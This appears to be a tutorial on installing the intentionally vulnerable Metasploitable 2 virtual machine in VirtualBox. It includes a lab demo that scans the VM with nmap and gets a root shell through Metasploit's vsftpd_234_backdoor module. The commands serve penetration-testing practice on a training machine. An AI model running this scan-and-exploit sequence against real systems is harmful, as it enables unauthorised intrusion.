# Walkthrough-Install-Metasploitable2-Virtual-Machine
How to install Metasploitable 2 in VirtualBox

Let’s first discuss what Metasploitable is, it is a testing environment that is very useful for beginner who wants to practice and test their penetration testing skills and security research. It is a target machine that is used to discover and penetrate vulnerabilities so that the user gets an idea of real-life targets and machines.
In other words, Metasploitable is a virtual machine intentionally vulnerable version of Ubuntu designed for testing security tools and demonstrating common vulnerabilities.
To install this virtual machine in your virtual box, We assume that you have a virtual box installed on your system.
Installation
Step 1:  Download the Metasploitable 2 file. 
 
 
Step 2: The file initially will be in zip format so we need to extract it, after extracting the file open VirtualBox.
 
 
Step 3: Now as shown in the above image click on the new option in the Virtual box.
 
 
•	now a window will pop up and you will be asked to provide some details like the name of your machine, installation path, type, and version.
•	fill in the details like:
Name: as per your choice
Path: leave as recommended
Type: Linux
Version: other (64-bit)
 
 
Step 4: Select the RAM you want to provide to the virtual machine. recommended (512Mb).
 
 
Step 5: Now choose the option to use an existing virtual hard disk file.
 
 
•	Now locate the file that we have extracted.
Step 6: Now save the file and you will see that the instance is created with the name you have given.
 
 
•	We are good to go with the machine just press the start button from the top and wait for it to start and load the instance.
 
 
Step 7. once the instance is loaded you will be asked to provide a login name and password. By default the credentials are :
Default login: msfadmin
Default password: msfadmin
 
 
•	once you log in with credentials you will be directed to the machine and we are done with the installation process.
Demo of penetration testing with Metasploitable 2
Step 1: open your both machines Metasploitable 2 and kali Linux side by side.
•	First, we need to run both instances at the same time side by side so that we will be able to see the changes clearly. launch Vbox and start both Linux and Metasploitable 2 side by side.
 
 
Step 2: let’s check the IP addresses of both machines to get an overview of the target machine.
•	now let’s open the terminal and check for the IP address of Metasploitable 2 on which we are going to perform the attack. use the following command:
msfadmin@metasploitable:~$ ifconfig
•	from the above image, we can see that we have an IP address i.e. 192.168.10.5 of the target machine.
Step 3: now we will be performing a network scan with the help of the Nmap tool to see what services are running on target and which are way into the target.
•	now the first step is to look for loops and vulnerabilities so that we can exploit the machine, to do so we will use Nmap scan on a Linux terminal. use command:
root-user-#/ $ nmap -sV -O 192.168.10.5
 
 
•	in the above command -sV is used for getting the versions of services running on the target machine and -O is used to detect the operating system on the target machine.
•	now we can see that we have so many exploitations ways and vulnerabilities to perform, we will be using the vsftpd_234_backdoor exploit, for exploitation and gaining access to the machine.
•	open Metasploit Framework with the command:
Step 4:  Now that we have all the info related to the exploit that we need to use i.e. vsftpd_backdoor so now we can use Metasploit to exploit the machine and get access to the command shell. which will eventually give us access to the target machine.
•	start the Metasploit Framework by the command mentioned below:
root-user-#/ $ msfconsole
•	after following the commands, we are going to choose the exploit that is vsftpd_backdoor and then set Rhost (targeted IP).
Step 5: Now all we need to do is deploy the exploit into the target machine with the help of msfconsole, to do so we need to follow some basic steps that are:
•	first, let’s select the exploit that we are going to use in this case it is vsftpd_backdoor, so we will use the following command :
msf6~/ use exploit/unix/ftp/vsftpd_234_backdoor
•	after selecting the above exploit let’s set up the target to which we are deploying the exploit.
msf6~/ (unix/ftp/vsftpd_234_backdoor): show options
 
 
•	now we can see that we have the option to set RHOST which is the receiver host. so we will set it to the IP address of the target machine.
msf6~/ (unix/ftp/vsftpd_234_backdoor): set RHOST 192.168.10.5
Step 6: The final step is to run the exploit, by command exploit.
msf6~/ (unix/ftp/vsftpd_234_backdoor): exploit
•	after setting RHOST just enter the exploit command and you will see the command shell of the target machine is obtained.
 
 
•	now we have successfully penetrated the target by obtaining a shell, you can try commands and verify in both machines at the same time. 
Step 7: Verify by using some command shell commands like print the working directory or ls items in a folder.
pwd, ls -l, ls -a etc
•	so we have successfully taken look into how Metasploitable is useful for practicing penetration testing skills.
•	we can see that both sides of the files are the same and we have root access to the machine.
Conclusion:
Metasploitable 2 is a great machine to practice and learn about penetration testing and hacking, while it comes with so many vulnerabilities and flaws that you can keep on digging and make your pen testing skills better. Currently, another version of Metasploitable is also available you can also go with that the process of configuring and installation is the same as above.
In the above article, we have learned how to install Metasploitable version 2 successfully and seen a demo of exploitation with the most famous and basic exploit that is vsftpd_backdoor, there are many more exploits and techniques to learn and practice.

